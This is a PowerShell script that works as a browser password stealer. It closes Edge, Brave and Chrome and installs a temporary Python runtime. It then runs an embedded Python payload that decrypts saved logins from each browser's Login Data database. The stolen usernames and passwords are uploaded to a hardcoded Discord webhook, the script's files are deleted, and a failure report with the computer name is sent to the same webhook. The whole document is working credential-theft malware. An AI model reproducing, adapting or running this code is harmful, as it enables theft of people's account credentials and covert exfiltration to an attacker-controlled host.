$wh="https://discord.com/api/webhooks/1467523812563357737/NtrM4DGzR7UGo0mOZ4i2-Y65OzXuto6PCbm-T8K67_JoFGV_rElaAwtptxjQJbPGH5i6"
taskkill /F /IM msedge.exe,brave.exe,chrome.exe 2>$null
Start-Sleep 2
try{
Invoke-WebRequest "https://www.python.org/ftp/python/3.11.9/python-3.11.9-embed-amd64.zip" -OutFile "$env:TEMP\py.zip" -UseBasicParsing -TimeoutSec 30
Expand-Archive "$env:TEMP\py.zip" "$env:TEMP\py" -Force
(Get-Content "$env:TEMP\py\python311._pth") -replace '#import site','import site'|Out-File "$env:TEMP\py\python311._pth" -Encoding ascii
Invoke-WebRequest "https://bootstrap.pypa.io/get-pip.py" -OutFile "$env:TEMP\py\gp.py" -UseBasicParsing
cd "$env:TEMP\py"
.\python.exe gp.py --no-warn-script-location 2>$null
.\python.exe -m pip install pycryptodome pypiwin32 --quiet 2>$null
@'
import os,json,base64,sqlite3,shutil,win32crypt
from Crypto.Cipher import AES
def d(db,st,n):
 try:
  k=win32crypt.CryptUnprotectData(base64.b64decode(json.load(open(st))["os_crypt"]["encrypted_key"])[5:],None,None,None,0)[1]
  shutil.copy2(db,"t.db");c=sqlite3.connect("t.db");r=[]
  for row in c.execute("SELECT origin_url,username_value,password_value FROM logins WHERE username_value!=''"):
   try:r.append(f"[{n}] {row[0]}\nUsername: {row[1]}\nPassword: {AES.new(k,AES.MODE_GCM,nonce=row[2][3:15]).decrypt_and_verify(row[2][15:-16],row[2][-16:]).decode()}\n")
   except:pass
  c.close();os.remove("t.db");return r
 except:return []
res=[]
e=os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data")
if os.path.exists(e+r"\Default\Login Data"):res+=d(e+r"\Default\Login Data",e+r"\Local State","EDGE")
b=os.path.expandvars(r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data")
if os.path.exists(b+r"\Default\Login Data"):res+=d(b+r"\Default\Login Data",b+r"\Local State","BRAVE")
g=os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data")
if os.path.exists(g+r"\Default\Login Data"):res+=d(g+r"\Default\Login Data",g+r"\Local State","CHROME")
if res:
 with open("p.txt","w",encoding="utf-8")as f:f.write(f"TOTAL: {len(res)}\n{'='*60}\n\n"+"".join(res))
 print("OK")
else:print("NO")
'@|Out-File "e.py" -Encoding UTF8
$r=.\python.exe e.py 2>$null
if($r -eq "OK"){curl.exe -F "file=@p.txt" $wh 2>$null;Remove-Item p.txt -Force}
cd $env:TEMP;Remove-Item py,py.zip -Recurse -Force
}catch{curl.exe -X POST -H "Content-Type: application/json" -d "{`"content`":`"Failed on $env:COMPUTERNAME`"}" $wh}
